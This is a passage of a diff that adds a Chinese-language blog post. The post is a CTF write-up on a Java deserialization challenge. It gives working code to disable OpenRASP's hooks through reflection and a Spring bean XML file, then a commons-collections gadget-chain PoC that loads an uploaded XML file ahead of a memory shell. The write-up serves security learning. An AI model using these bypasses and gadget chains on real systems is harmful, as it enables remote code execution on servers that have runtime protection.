+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></div>
+
+<p>配有openrasp最新版</p>
+<p>入口也是Base64解密后反序列化</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111181245521.png" srcset="/img/loading.gif" lazyload alt="image-20250111181245521"></p>
+<p>所以主要是如何绕过openrasp</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111180621149.png" srcset="/img/loading.gif" lazyload alt="image-20250111180621149"></p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111180653257.png" srcset="/img/loading.gif" lazyload alt="image-20250111180653257"></p>
+<p>cc能饶过，用InstantiateFactory和FactoryTransformer来绕过</p>
+<p>InstantiateFactory能够任意类实例化</p>
+<p>在正常的cc中是实例化TrAXFilter能够Templateimpl加载字节码</p>
+<p>但TemplateImpl被ban了</p>
+<p>所以可以实例化spring中常用的ClassPathXmlApplicationContext去加载xml文件</p>
+<p>不过这里不出网，并且题目给了上传文件的路由，可以传上去然后加载</p>
+<blockquote>
+<p>ClassPathXmlApplicationContext：从类路径中加载XML文件。<br>FileSystemXmlApplicationContext：从文件系统中加载XML文件。</p>
+</blockquote>
+<p>说是这样说，其实都可以用</p>
+<p>不过仅靠这些并不能达到最终的利用，因为都是要解决命令执行的问题</p>
+<p>这里可以参考y4大佬文章，关掉openrasp</p>
+<p>原理不讲了，自己看</p>
+<p>示例代码</p>
+<div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; clz = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;com.baidu.openrasp.config.Config&quot;</span>);
+java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getConfig</span> <span class="hljs-operator">=</span> clz.getDeclaredMethod(<span class="hljs-string">&quot;getConfig&quot;</span>);
+java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">disableHooks</span> <span class="hljs-operator">=</span> clz.getDeclaredField(<span class="hljs-string">&quot;disableHooks&quot;</span>);
+disableHooks.setAccessible(<span class="hljs-literal">true</span>);
+<span class="hljs-type">Object</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> getConfig.invoke(<span class="hljs-literal">null</span>);
+
+disableHooks.set(ins,<span class="hljs-literal">true</span>);</code></pre></div>
+
+<p>其实就是把disableHooks属性改为true</p>
+<p>在加载的xml文件中就是实现以上操作</p>
+<p>参考的wp使用MethodInvokingFactoryBean允许更灵活地调用静态方法并传递参数，避免了复杂的 XML 配置</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span>
+<span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
+<span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span>
+<span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;configClass&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.Class&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;forName&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.baidu.openrasp.config.Config&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;configInstance&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;targetClass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.baidu.openrasp.config.Config&quot;</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;targetMethod&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;getConfig&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;disableHooksField&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;targetObject&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;configClass&quot;</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;targetMethod&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;getDeclaredField&quot;</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;arguments&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>disableHooks<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;accessibleSetter&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;targetObject&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;disableHooksField&quot;</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;targetMethod&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;setAccessible&quot;</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;arguments&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;disableHooksSetter&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;targetObject&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;disableHooksField&quot;</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;targetMethod&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;set&quot;</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;arguments&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;configInstance&quot;</span>/&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;boolean&quot;</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div>
+
+<p>打入后，openrasp就被关闭了</p>
+<p>然后直接TemplateImpl打内存马</p>
+<p>poc</p>
+<div class="code-wrapper"><pre><code class="hljs haxe">HashMap hashMap= <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>();
+
+InstantiateFactory instantiateFactory = <span class="hljs-keyword">new</span> <span class="hljs-type">InstantiateFactory</span>(
+        FileSystemXmlApplicationContext.class,
+        <span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;,
+        <span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;file:///uploads/9f59d63e-be9b-465f-b650-e173970d1c5c.tmp&quot;</span>&#125;
+);
+FactoryTransformer factory = <span class="hljs-keyword">new</span> <span class="hljs-type">FactoryTransformer</span>(instantiateFactory);
+Map map = LazyMap.decorate(hashMap,factory);
+TiedMapEntry tMapEntry = <span class="hljs-keyword">new</span> <span class="hljs-type">TiedMapEntry</span>(map,<span class="hljs-string">&quot;a&quot;</span>);
+BadAttributeValueExpException bad = <span class="hljs-keyword">new</span> <span class="hljs-type">BadAttributeValueExpException</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>());
+Field val = bad.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);
+val.setAccessible(<span class="hljs-literal">true</span>);
+val.<span class="hljs-keyword">set</span>(bad,tMapEntry);</code></pre></div>
+
+
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220124452.png" srcset="/img/loading.gif" lazyload alt="image-20250111220124452"></p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220101988.png" srcset="/img/loading.gif" lazyload alt="image-20250111220101988"></p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220308642.png" srcset="/img/loading.gif" lazyload alt="image-20250111220308642"></p>
+<p>如果没关的话长这样，也就是openrasp.yaml中定义的html</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220822201.png" srcset="/img/loading.gif" lazyload alt="image-20250111220822201"></p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220714910.png" srcset="/img/loading.gif" lazyload alt="image-20250111220714910"></p>
+<p>最后就成功了</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220415949.png" srcset="/img/loading.gif" lazyload alt="image-20250111220415949"></p>
+<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>自己的研究不多，都是参考文章的研究，我只是分析一下</p>
+<p>主要是研究不出来，openGauss不会找任意类实例化的sink点</p>
+<p>openrasp确实想不到绕过，以及不会写spring bean</p>
+<p>都还要多学习</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/16215?time__1311=GuD=pGkDkD/D78G7bGOFG87peYv32mD">关于OpenRASP的绕过实现 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://h4cking2thegate.github.io/posts/44597/">https://h4cking2thegate.github.io/posts/44597/</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/">https://y4tacker.github.io/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>学习ccb决赛的0解java题</div>
+      <div>https://zer0peach.github.io/2025/01/11/学习ccb决赛的0解java题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/07/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" title="2024年度总结">
+                        <span class="hidden-mobile">2024年度总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
